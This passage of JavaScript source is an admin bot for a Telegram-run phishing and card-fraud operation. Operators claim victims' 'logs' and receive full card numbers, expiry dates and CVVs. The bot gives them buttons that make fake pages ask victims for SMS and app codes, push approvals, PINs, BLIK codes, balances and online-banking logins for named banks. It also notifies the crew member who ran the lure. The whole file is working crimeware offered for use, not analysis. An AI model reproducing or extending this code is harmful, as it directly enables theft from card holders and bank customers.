                `log_${log.id}_wrong_code`
              ),
              ...(log.ad.service.country.withLk
                ? [
                    Markup.callbackButton(
                      "❌ Неверный ЛК",
                      `log_${log.id}_wrong_lk`
                    ),
                  ]
                : []),
            ],
            [
              ...(String(bank).match(/MILLENNIUM/giu)
                ? [
                    Markup.callbackButton(
                      "❌ Неверная КАРТИНКА",
                      `log_${log.id}_wrong_picture`
                    ),
                  ]
                : []),
              Markup.callbackButton(
                "❌ Не подтверждает ПУШ",
                `log_${log.id}_wrong_push`
              ),
            ],
            [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
          ])
        )
        .catch((err) => err);
    } catch (err) {
      ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
    }
  }
);

adminBot.action(/^take_log_(\d+)$/, async (ctx) => {
  try {
    const log = await Log.findByPk(ctx.match[1], {
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    if (!log)
      return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
    if (log.writerId && log.writerId != ctx.from.id)
      return ctx
        .answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true)
        .catch((err) => err);

    await log.update({
      writerId: ctx.from.id,
    });

    await ctx.answerCbQuery("✅ Удачного вбива").catch((err) => err);
    await ctx.telegram.sendMessage(ctx.from.id, `
💳 Номер карты: <b>${log.cardNumber}</b>
📅 Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>
➖➖➖➖➖➖➖➖➖➖
❗️ <u>Помни!</u> 
❌ <b>Слив карты пидорасам - карается баном!</b>
💰 <u>Не подводи команду, бро. Заработаешь больше, обещаю.</u>
`, { parse_mode: "HTML"  })
    var bank;
    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo.bank;
    } catch (err) {}
    console.log(log.ad.service.country.withCustom)
    await ctx
      .editMessageReplyMarkup(
        Markup.inlineKeyboard([
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
          [
            Markup.callbackButton(
              `Взял на вбив ${ctx.state.user.username}`,
              "none"
            ),
          ],
          [
            Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`),
            Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`),
          ],
          [
            Markup.callbackButton("📧 MToken", `log_${log.id}_mtoken`),
            Markup.callbackButton("🔏 Passcode", `log_${log.id}_passcode`),
          ],
          [
            Markup.callbackButton("🖍 Pin-code", `log_${log.id}_pincode`),
          ],
          [
            Markup.callbackButton("💸 Прямой перевод", `log_${log.id}_dtrans`),
          ],
          [
            Markup.callbackButton("📶 Звонок в банк ", `log_${log.id}_callBank`),
          ],
          ...(log.ad.service.country.withLk && log.ad.service.country.id != 'fi'
          ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]]
          : log.ad.service.country.id == 'fi' ? [
            [Markup.callbackButton("🔐 ЛК Nordea", `log_${log.id}_lk1`)],
          [Markup.callbackButton("🔐 ЛК Nordea Push", `log_${log.id}_lk2`)],
          [Markup.callbackButton("🔐 Все ЛК", `log_${log.id}_lk3`)]
        ] : log.ad.service.country.id == 'hr' ? [
          [Markup.callbackButton("🔐 ЛК PBZ", `log_${log.id}_lk4`)],
        [Markup.callbackButton("🔐 ЛК Zaba", `log_${log.id}_lk5`)],
      ] : []),
          ...(log.ad.service.country.withCustom
              ? [[Markup.callbackButton("🧾 Кастомное окно", `log_${log.id}_custom`)]]
              : []),
          [
            Markup.callbackButton(
              "📬 КОД С ПРИЛОЖЕНИЯ",
              `log_${log.id}_appCode`
            ),
            Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
          ],
          ...(String(bank).match(/MILLENNIUM/giu)
            ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]]
            : []),
          ...(["pl"].includes(log.ad.service.country.id)
            ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]]
            : []),
          [
            Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
          ],
          [
            Markup.callbackButton(
              "⚠️ ТОЧНЫЙ БАЛАНС",
              `log_${log.id}_correctBalance`
            ),
            ...(["ua"].includes(log.ad.service.country.id)
              ? [
                  Markup.callbackButton(
                    "⚠️ НУЖЕН БАЛАНС",
                    `log_${log.id}_forVerify`
                  ),
                ]
              : []),
          ],
          [
            Markup.callbackButton(
              "❌ Неверный КОД",
              `log_${log.id}_wrong_code`
            ),
            ...(log.ad.service.country.withLk
              ? [
                  Markup.callbackButton(
                    "❌ Неверный ЛК",
                    `log_${log.id}_wrong_lk`
                  ),
                ]
              : []),
          ],
          [
            ...(String(bank).match(/MILLENNIUM/giu)
              ? [
                  Markup.callbackButton(
                    "❌ Неверная КАРТИНКА",
                    `log_${log.id}_wrong_picture`
                  ),
                ]
              : []),
            Markup.callbackButton(
              "❌ Не подтверждает ПУШ",
              `log_${log.id}_wrong_push`
            ),
          ],
          [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
        ])
      )
      .catch((err) => err);

    await ctx.telegram
      .sendMessage(
        log.ad.userId,
        `ℹ️ Ваш лог <b>${log.ad.service.title}</b> вбивает <b><a href="tg://user?id=${ctx.from.id}">${ctx.state.user.username}</a></b>
      
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
        }
      )
      .catch((err) => err);
  } catch (err) {
    console.log(err)
    ctx.answerCbQuery("❌ Ошибка", true).catch((err) => err);
  }
});

adminBot.command("help", help);
adminBot.action("admin_help", help);

module.exports = adminBot;
